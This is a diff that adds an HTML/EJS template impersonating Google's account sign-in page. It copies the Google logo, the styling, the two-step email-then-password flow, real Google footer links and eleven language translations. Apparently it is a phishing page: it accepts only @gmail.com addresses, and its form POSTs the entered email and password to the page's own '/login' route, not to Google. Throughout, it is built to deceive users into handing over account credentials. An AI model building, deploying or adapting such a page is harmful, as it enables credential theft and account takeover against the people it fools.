@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #202124;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .card {
+            background-color: #292a2d;
+            border: 1px solid #3c4043;
+            border-radius: 28px;
+            width: 100%;
+            max-width: 880px;
+            padding: 48px 40px 36px;
+            display: flex;
+            gap: 64px;
+            margin: auto;
+        }
+
+        .card-left {
+            flex: 0 0 40%;
+        }
+
+        .card-right {
+            flex: 1;
+        }
+
+        .logo-img {
+            width: 75px;
+            height: 75px;
+            display: block;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 36px;
+            line-height: 44px;
+            font-weight: 400;
+            color: #e8eaed;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            color: #e8eaed;
+            margin-bottom: 32px;
+        }
+
+        .messages {
+            margin-bottom: 16px;
+        }
+
+        .message {
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin: 8px 0;
+            font-size: 14px;
+        }
+
+        .success {
+            background-color: #1e3a2a;
+            color: #81c995;
+            border: 1px solid #2d5a3d;
+        }
+
+        .error {
+            background-color: #3c1e1e;
+            color: #f28b82;
+            border: 1px solid #5c2a2a;
+        }
+
+        .info {
+            background-color: #1e2a3c;
+            color: #8ab4f8;
+            border: 1px solid #2d4a5c;
+        }
+
+        .field {
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .field input {
+            width: 100%;
+            height: 56px;
+            padding: 22px 15px 4px;
+            border: 1px solid #5f6368;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #e8eaed;
+            background-color: #202124;
+            outline: none;
+            transition: border-color 0.15s ease-in-out;
+        }
+
+        .field input:focus {
+            border: 2px solid #8ab4f8;
+            padding: 21px 14px 3px;
+        }
+
+        .field input.invalid {
+            border-color: #f28b82;
+        }
+
+        .field input.invalid:focus {
+            border-color: #f28b82;
+        }
+
+        .field label {
+            position: absolute;
+            left: 15px;
+            top: 19px;
+            font-size: 16px;
+            color: #9aa0a6;
+            pointer-events: none;
+            transition: top 0.15s ease, font-size 0.15s ease, color 0.15s ease;
+        }
+
+        .field input:focus + label,
+        .field input:not(:placeholder-shown) + label {
+            top: 6px;
+            font-size: 11px;
+            line-height: 14px;
+        }
+
+        .field input:focus + label {
+            color: #8ab4f8;
+        }
+
+        .email-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid #5f6368;
+            border-radius: 16px;
+            padding: 6px 8px 6px 6px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #e8eaed;
+            cursor: pointer;
+            background: #202124;
+            font-family: inherit;
+        }
+
+        .email-chip:hover {
+            background: #212226;
+        }
+
+        .email-chip .avatar {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background-color: #5f6368;
+            color: #fff;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-transform: uppercase;
+        }
+
+        .email-chip svg {
+            width: 18px;
+            height: 18px;
+            fill: #9aa0a6;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-top: 8px;
+            font-size: 14px;
+            color: #e8eaed;
+        }
+
+        .show-password input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .link {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .forgot {
+            margin-top: 24px;
+        }
+
+        .guest-text {
+            font-size: 14px;
+            color: #9aa0a6;
+            line-height: 1.4;
+            margin-top: 32px;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 48px;
+        }
+
+        .btn {
+            background-color: #8ab4f8;
+            border: none;
+            color: #202124;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 20px;
+            cursor: pointer;
+            letter-spacing: 0.25px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+
+        .btn:hover {
+            background-color: #aecbfa;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.6);
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            max-width: 880px;
+            margin: 0 auto;
+            padding: 24px 4px;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+
+        .footer select {
+            border: none;
+            background: transparent;
+            font-size: 12px;
+            color: #9aa0a6;
+            cursor: pointer;
+        }
+
+        .footer select option {
+            background-color: #202124;
+            color: #e8eaed;
+        }
+
+        .footer .footer-links a {
+            color: #9aa0a6;
+            text-decoration: none;
+            margin-left: 24px;
+        }
+
+        .footer .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 840px) {
+            body {
+                background-color: #121212;
+            }
+            .card {
+                flex-direction: column;
+                gap: 32px;
+                max-width: 100%;
+                width: 100%;
+                border: none;
+                background: transparent;
+                border-radius: 0;
+                padding: 48px 24px 36px;
+            }
+            .card-left {
+                flex: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .footer {
+                padding: 8px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="card-left">
+            <svg class="logo-img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+            </svg>
+
+            <h1 id="heading" data-i18n="signin">Sign in</h1>
+            <p class="subtitle" id="subtitle" data-i18n="useAccount">Use your Google Account</p>
+        </div>
+
+        <div class="card-right">
+            <% var flashTypes = Object.keys(messages); if (flashTypes.length > 0) { %>
+                <div class="messages">
+                    <% flashTypes.forEach(function(type) { %>
+                        <div class="message <%= type %>">
+                            <% messages[type].forEach(function(text) { %><%= text %><% }); %>
+                        </div>
+                    <% }); %>
+                </div>
+            <% } %>
+
+            <form action="/login" method="POST" id="login-form">
+                <div class="step active" id="step-email">
+                    <div class="field">
+                        <input type="text" id="email" name="email" required placeholder=" " autocomplete="username">
+                        <label for="email" data-i18n="emailPlaceholder">Email or phone</label>
+                    </div>
+
+                    <div class="forgot">
+                        <a href="#" class="link" data-i18n="forgotEmail">Forgot email?</a>
+                    </div>
+
+                    <p class="guest-text"><span data-i18n="guestText">Not your computer? Use a private browsing window to sign in.</span> <a href="#" class="link" data-i18n="learnMore">Learn more about using Guest mode</a></p>
+
+                    <div class="actions">
+                        <a href="#" class="link" data-i18n="createAccount">Create account</a>
+                        <button type="button" class="btn" id="next-btn" data-i18n="next">Next</button>
+                    </div>
+                </div>
+
+                <div class="step" id="step-password">
+                    <div style="margin-bottom: 24px;">
+                        <button type="button" class="email-chip" id="email-chip">
+                            <span class="avatar" id="chip-initial"></span>
+                            <span id="chip-email"></span>
+                            <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
+                        </button>
+                    </div>
+
+                    <div class="field">
+                        <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password">
+                        <label for="password" data-i18n="passwordPlaceholder">Enter your password</label>
+                    </div>
+
+                    <div class="show-password">
+                        <input type="checkbox" id="show-password">
+                        <label for="show-password" data-i18n="showPassword">Show password</label>
+                    </div>
+
+                    <div class="forgot">
+                        <a href="#" class="link" data-i18n="forgotPassword">Forgot password?</a>
+                    </div>
+
+                    <div class="actions">
+                        <a href="#" class="link" id="back-link" data-i18n="back">Back</a>
+                        <button type="submit" class="btn" data-i18n="next">Next</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <select id="language-select">
+            <option value="en">English (United States)</option>
+            <option value="it">Italiano</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="pt">Português (Brasil)</option>
+            <option value="nl">Nederlands</option>
+            <option value="pl">Polski</option>
+            <option value="tr">Türkçe</option>
+            <option value="ja">日本語</option>
+            <option value="zh-CN">中文（简体）</option>
+        </select>
+        <div class="footer-links">
+            <a href="https://support.google.com/accounts/?hl=it#topic=3382296" target="_blank" rel="noopener" data-i18n="help">Help</a>
+            <a href="https://policies.google.com/terms?hl=it" target="_blank" rel="noopener" data-i18n="privacy">Privacy</a>
+            <a href="https://policies.google.com/terms?hl=it" target="_blank" rel="noopener" data-i18n="terms">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const stepEmail = document.getElementById('step-email');
+        const stepPassword = document.getElementById('step-password');
+        const heading = document.getElementById('heading');
+        const subtitle = document.getElementById('subtitle');
+        const chip = document.getElementById('email-chip');
+        const chipEmail = document.getElementById('chip-email');
+        const chipInitial = document.getElementById('chip-initial');
+        const showPassword = document.getElementById('show-password');
+
+        function isValidEmail(value) {
+            return /^[^@\s]+@gmail\.com$/i.test(value.trim());
+        }
+
+        function goToPassword() {
+            const email = emailInput.value.trim();
+            if (!email || !isValidEmail(email)) {
+                emailInput.classList.add('invalid');
+                emailInput.focus();
+                return;
+            }
+            emailInput.classList.remove('invalid');
+            chipEmail.textContent = email;
+            chipInitial.textContent = email.charAt(0);
+            stepEmail.classList.remove('active');
+            stepPassword.classList.add('active');
+            heading.textContent = translations[currentLang].welcome;
+            subtitle.style.display = 'none';
+            emailInput.removeAttribute('required');
+            passwordInput.setAttribute('required', '');
+            passwordInput.focus();
+        }
+
+        function goToEmail() {
+            stepPassword.classList.remove('active');
+            stepEmail.classList.add('active');
+            heading.textContent = translations[currentLang].signin;
+            subtitle.style.display = '';
+            passwordInput.removeAttribute('required');
+            emailInput.setAttribute('required', '');
+            emailInput.focus();
+        }
+
+        document.getElementById('next-btn').addEventListener('click', goToPassword);
+        document.getElementById('back-link').addEventListener('click', goToEmail);
+        chip.addEventListener('click', goToEmail);
+        emailInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                goToPassword();
+            }
+        });
+        showPassword.addEventListener('change', () => {
+            passwordInput.type = showPassword.checked ? 'text' : 'password';
+        });
+
+        document.getElementById('login-form').addEventListener('submit', (e) => {
+            if (passwordInput.value.length < 6) {
+                e.preventDefault();
+                passwordInput.classList.add('invalid');
+                passwordInput.focus();
+            }
+        });
+
+        emailInput.addEventListener('input', () => emailInput.classList.remove('invalid'));
+        passwordInput.addEventListener('input', () => passwordInput.classList.remove('invalid'));
+
+        // ---------- Language / automatic translation ----------
+        const translations = {
+            en: {
+                signin: 'Sign in',
+                welcome: 'Welcome',
+                useAccount: 'Use your Google Account',
+                emailPlaceholder: 'Email or phone',
+                forgotEmail: 'Forgot email?',
+                guestText: 'Not your computer? Use a private browsing window to sign in.',
+                learnMore: 'Learn more about using Guest mode',
+                createAccount: 'Create account',
+                next: 'Next',
+                passwordPlaceholder: 'Enter your password',
+                showPassword: 'Show password',
+                forgotPassword: 'Forgot password?',
+                back: 'Back',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms'
+            },
+            it: {
+                signin: 'Accedi',
+                welcome: 'Benvenuto',
+                useAccount: 'Utilizza il tuo Account Google',
+                emailPlaceholder: 'Email o telefono',
+                forgotEmail: 'Non ricordi l\'indirizzo email?',
+                guestText: 'Non si tratta del tuo computer? Utilizza una finestra di navigazione privata per accedere.',
+                learnMore: 'Scopri di più sull\'utilizzo della modalità Ospite',
+                createAccount: 'Crea un account',
+                next: 'Avanti',
+                passwordPlaceholder: 'Inserisci la tua password',
+                showPassword: 'Mostra password',
+                forgotPassword: 'Password dimenticata?',
+                back: 'Indietro',
+                help: 'Guida',
+                privacy: 'Privacy',
+                terms: 'Termini'
+            },
+            es: {
+                signin: 'Iniciar sesión',
+                welcome: 'Bienvenido',
+                useAccount: 'Usa tu cuenta de Google',
+                emailPlaceholder: 'Correo electrónico o teléfono',
+                forgotEmail: '¿Has olvidado tu correo electrónico?',
+                guestText: '¿No es tu equipo? Usa una ventana de navegación privada para iniciar sesión.',
+                learnMore: 'Más información sobre el modo invitado',
+                createAccount: 'Crear cuenta',
+                next: 'Siguiente',
+                passwordPlaceholder: 'Introduce tu contraseña',
+                showPassword: 'Mostrar contraseña',
+                forgotPassword: '¿Has olvidado tu contraseña?',
+                back: 'Atrás',
+                help: 'Ayuda',
+                privacy: 'Privacidad',
+                terms: 'Términos'
+            },
+            fr: {
+                signin: 'Se connecter',
+                welcome: 'Bienvenue',
+                useAccount: 'Utilisez votre compte Google',
+                emailPlaceholder: 'Adresse e-mail ou numéro de téléphone',
+                forgotEmail: 'Vous avez oublié votre adresse e-mail ?',
+                guestText: 'Vous n\'utilisez pas votre ordinateur ? Utilisez une fenêtre de navigation privée pour vous connecter.',
+                learnMore: 'En savoir plus sur le mode Invité',
+                createAccount: 'Créer un compte',
+                next: 'Suivant',
+                passwordPlaceholder: 'Saisissez votre mot de passe',
+                showPassword: 'Afficher le mot de passe',
+                forgotPassword: 'Mot de passe oublié ?',
+                back: 'Retour',
+                help: 'Aide',
+                privacy: 'Confidentialité',
+                terms: 'Conditions'
+            },
+            de: {
+                signin: 'Anmelden',
+                welcome: 'Willkommen',
+                useAccount: 'Mit Ihrem Google-Konto fortfahren',
+                emailPlaceholder: 'E-Mail-Adresse oder Telefonnummer',
+                forgotEmail: 'E-Mail-Adresse vergessen?',
+                guestText: 'Nicht Ihr Computer? Verwenden Sie ein privates Browserfenster, um sich anzumelden.',
+                learnMore: 'Mehr zum Gastmodus erfahren',
+                createAccount: 'Konto erstellen',
+                next: 'Weiter',
+                passwordPlaceholder: 'Passwort eingeben',
+                showPassword: 'Passwort anzeigen',
+                forgotPassword: 'Passwort vergessen?',
+                back: 'Zurück',
+                help: 'Hilfe',
+                privacy: 'Datenschutz',
+                terms: 'Nutzungsbedingungen'
+            },
+            pt: {
+                signin: 'Fazer login',
+                welcome: 'Bem-vindo',
+                useAccount: 'Use sua Conta do Google',
+                emailPlaceholder: 'E-mail ou telefone',
+                forgotEmail: 'Esqueceu seu e-mail?',
+                guestText: 'Não é seu computador? Use uma janela de navegação privada para fazer login.',
+                learnMore: 'Saiba mais sobre o modo visitante',
+                createAccount: 'Criar conta',
+                next: 'Avançar',
+                passwordPlaceholder: 'Digite sua senha',
+                showPassword: 'Mostrar senha',
+                forgotPassword: 'Esqueceu sua senha?',
+                back: 'Voltar',
+                help: 'Ajuda',
+                privacy: 'Privacidade',
+                terms: 'Termos'
+            },
+            nl: {
+                signin: 'Inloggen',
+                welcome: 'Welkom',
+                useAccount: 'Gebruik uw Google-account',
+                emailPlaceholder: 'E-mailadres of telefoonnummer',
+                forgotEmail: 'E-mailadres vergeten?',
+                guestText: 'Niet uw computer? Gebruik een privévenster om in te loggen.',
+                learnMore: 'Meer informatie over de gastmodus',
+                createAccount: 'Account maken',
+                next: 'Volgende',
+                passwordPlaceholder: 'Voer uw wachtwoord in',
+                showPassword: 'Wachtwoord weergeven',
+                forgotPassword: 'Wachtwoord vergeten?',
+                back: 'Terug',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Voorwaarden'
+            },
+            pl: {
+                signin: 'Zaloguj się',
+                welcome: 'Witaj',
+                useAccount: 'Użyj swojego konta Google',
+                emailPlaceholder: 'Adres e-mail lub numer telefonu',
+                forgotEmail: 'Nie pamiętasz adresu e-mail?',
+                guestText: 'To nie Twój komputer? Korzystaj z prywatnego okna przeglądarki, aby logować się prywatnie.',
+                learnMore: 'Więcej o trybie gościa',
+                createAccount: 'Utwórz konto',
+                next: 'Dalej',
+                passwordPlaceholder: 'Wpisz hasło',
+                showPassword: 'Pokaż hasło',
+                forgotPassword: 'Nie pamiętasz hasła?',
+                back: 'Wstecz',
+                help: 'Pomoc',
+                privacy: 'Prywatność',
+                terms: 'Warunki'
+            },
+            tr: {
+                signin: 'Oturum açın',
+                welcome: 'Hoş geldiniz',
+                useAccount: 'Google Hesabınızı kullanın',
+                emailPlaceholder: 'E-posta veya telefon',
+                forgotEmail: 'E-postanızı mı unuttunuz?',
+                guestText: 'Bilgisayarınız değil mi? Özel oturum açmak için gizli bir tarama penceresi kullanın.',
+                learnMore: 'Misafir modu hakkında daha fazla bilgi edinin',
+                createAccount: 'Hesap oluşturun',
+                next: 'İleri',
+                passwordPlaceholder: 'Şifrenizi girin',
+                showPassword: 'Şifreyi göster',
+                forgotPassword: 'Şifrenizi mi unuttunuz?',
+                back: 'Geri',
+                help: 'Yardım',
+                privacy: 'Gizlilik',
+                terms: 'Koşullar'
+            },
+            ja: {
+                signin: 'ログイン',
+                welcome: 'ようこそ',
+                useAccount: 'Google アカウントを使用',
+                emailPlaceholder: 'メールアドレスまたは電話番号',
+                forgotEmail: 'メールアドレスを忘れた場合',
+                guestText: 'このパソコンはあなたのものではありませんか？ ログインするにはシークレット ウィンドウを使用してください。',
+                learnMore: 'ゲストモードの詳細',
+                createAccount: 'アカウントを作成',
+                next: '次へ',
+                passwordPlaceholder: 'パスワードを入力',
+                showPassword: 'パスワードを表示',
+                forgotPassword: 'パスワードを忘れた場合',
+                back: '戻る',
+                help: 'ヘルプ',
+                privacy: 'プライバシー',
+                terms: '利用規約'
+            },
+            'zh-CN': {
+                signin: '登录',
+                welcome: '欢迎',
+                useAccount: '使用您的 Google 帐号',
+                emailPlaceholder: '电子邮件地址或手机号码',
+                forgotEmail: '忘记电子邮件地址？',
+                guestText: '不是您的电脑？请使用无痕式窗口登录。',
+                learnMore: '详细了解访客模式',
+                createAccount: '创建帐号',
+                next: '下一步',
+                passwordPlaceholder: '输入您的密码',
+                showPassword: '显示密码',
+                forgotPassword: '忘记密码？',
+                back: '返回',
+                help: '帮助',
+                privacy: '隐私权',
+                terms: '条款'
+            }
+        };
+
+        let currentLang = 'en';
+
+        function saveLang(lang) {
+            try { localStorage.setItem('lang', lang); } catch (e) {}
+        }
+
+        function loadLang() {
+            try { return localStorage.getItem('lang'); } catch (e) { return null; }
+        }
+
+        function applyLanguage(lang) {
+            if (!translations[lang]) lang = 'en';
+            currentLang = lang;
+            const t = translations[lang];
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (t[key] !== undefined) el.textContent = t[key];
+            });
+            if (stepPassword.classList.contains('active')) {
+                heading.textContent = t.welcome;
+            }
+            saveLang(lang);
+        }
+
+        function initLanguage() {
+            const langSelect = document.getElementById('language-select');
+            if (!langSelect) return; // footer not parsed yet
+            langSelect.addEventListener('change', (e) => applyLanguage(e.target.value));                // Default to English; only override with the user's saved choice
+                const savedLang = loadLang();
+                if (savedLang && translations[savedLang]) {
+                    currentLang = savedLang;
+                }
+            langSelect.value = currentLang;
+            applyLanguage(currentLang);
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initLanguage);
+        } else {
+            initLanguage();
+        }
+    </script>
+</body>
+</html>
